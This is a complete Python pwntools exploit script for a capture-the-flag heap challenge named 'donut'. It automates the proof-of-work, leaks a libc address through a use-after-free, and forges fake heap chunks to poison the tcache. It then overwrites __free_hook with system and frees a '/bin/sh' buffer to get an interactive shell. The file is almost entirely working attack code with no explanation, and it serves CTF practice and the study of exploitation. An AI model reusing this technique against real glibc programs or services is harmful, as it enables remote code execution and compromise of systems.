#!/usr/bin/env python3

from pwn import *
import hashlib
from itertools import product

exe = ELF("./donut")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

def solve_pow(start_string, hash_end):
    for chars in product(string.ascii_letters, repeat=4):
        candidate = start_string + bytes(map(ord, chars))
        m = hashlib.sha256()
        m.update(candidate)
        if m.hexdigest().endswith(hash_end):
            print(f'POW solved: {candidate}')
            return candidate

    return None

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        p = remote("challs.m0lecon.it", 1743)
        p.recvuntil("Give me a string starting with ")
        start_string = p.recvuntil(" ")[:-1]
        p.recvuntil('such that its sha256sum ends in ')
        hash_end = p.recvuntil('.')[:-1].decode()
        p.sendline(solve_pow(start_string, hash_end))
        return p


def main():
    r = conn()

    def create_custom_donut(roundness, name = None, name_len = None):
        r.sendlineafter('[l]eave the factory\n', 'c')
        r.sendlineafter('The only donut customization currently allowed is the roundness. Please give me a number between 0 and 255!\n', str(roundness))
        r.recvuntil('Hold on, I\'m making it....\n')
        donut = r.recvuntil('Do you like it? (y/n)\n')[:-len('Do you like it? (y/n)\n')]
        if name is None:
            r.sendline('n')
            p = None
        else:
            r.sendline('y')
            if name_len is None:
                name_len = len(name)+1

            r.sendlineafter('First how long is it?\n', str(name_len))
            r.sendlineafter('What\'s your name?\n', name)
            r.recvuntil('Please give this code to the cashier to retrieve your donut! ')
            p = int(r.recvline().rstrip(), 0x10)

        return (donut, p)

    def destroy_donut(address):
        r.sendlineafter('[l]eave the factory\n', 't')
        r.sendlineafter("Please give me your donut code to destroy it!\n", hex(address))

    def view_donut(address):
        r.sendlineafter('[l]eave the factory\n', 'v')
        r.sendlineafter("Please give me your donut code to view it!\n", hex(address))
        donut = r.recvuntil('Welcome to the donut factory!\n')[:-len('Welcome to the donut factory!\n')]
        return donut

    def leak_byte(address, donuts):
        donut = view_donut(address)
        for i in range(0x100):
            if donuts[i] == donut[:0x1000]:
                return i

        raise Exception("Donut not found: {enhex(donut)}")

    def leak_bytes(address, size, donuts):
        leak = []
        for i in range(size):
            leak.append(leak_byte(address+i, donuts))

        return leak

    def dump_donuts():
        donuts = []
        for i in range(0x100):
            print(i)
            donut, _ = create_custom_donut(i)
            donuts.append(donut[:0x1000])

        with open('donuts.txt', 'w') as f:
            for i in range(0x100):
                f.write(f'{i}: {enhex(donuts[i])}\n')

    def parse_donuts():
        donuts = []
        with open('donuts.txt', 'r') as f:
            for line in f.readlines():
                index, donut = line.rstrip().split(": ")
                assert(int(index) == len(donuts))
                donuts.append(unhex(donut))

        return donuts

    # dump_donuts()  # Uncomment this if you don't have a donuts.txt
    donuts = parse_donuts()

    _, p = create_custom_donut(42, "name", 0x1000)  # larger than tcache
    create_custom_donut(137, "foo")  # to prevent coalescing with top chunk

    destroy_donut(p)

    libc_leak = leak_bytes(p, 8, donuts)
    libc_leak = u64(bytes(libc_leak))

    libc.address = libc_leak - 0x1ebbe0
    info(f"LIBC BASE: {hex(libc.address)}")

    payload = b''
    payload += p64(0) # prev_size
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data

    _, p = create_custom_donut(payload[0], payload[1:])
    first_fake_chunk_addr = p+0x10
    destroy_donut(first_fake_chunk_addr)  # first fake chunk goes into tcache
    second_fake_chunk_addr = p+0x30
    destroy_donut(second_fake_chunk_addr)  # second fake chunk goes into tcache (no coalescing because of tcache)

    destroy_donut(p)

    payload = b''
    payload += p64(0) # prev_size
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += p64(libc.symbols['__free_hook'])  # next_tcache_entry pointer
    payload += b'Y'*0x10  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data
    payload += p64(0x21) # size
    payload += b'X'*0x18  # chunk_data

    old_p = p
    _, p = create_custom_donut(payload[0], payload[1:])
    assert(p == old_p)

    create_custom_donut(73, 'XXX')  # creates 0x20-sized chunk, tcache now points to __free_hook

    address = p64(libc.symbols['system'])

    create_custom_donut(address[0], address[1:])

    _, p = create_custom_donut(ord('/'), 'bin/sh\0')

    destroy_donut(p)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()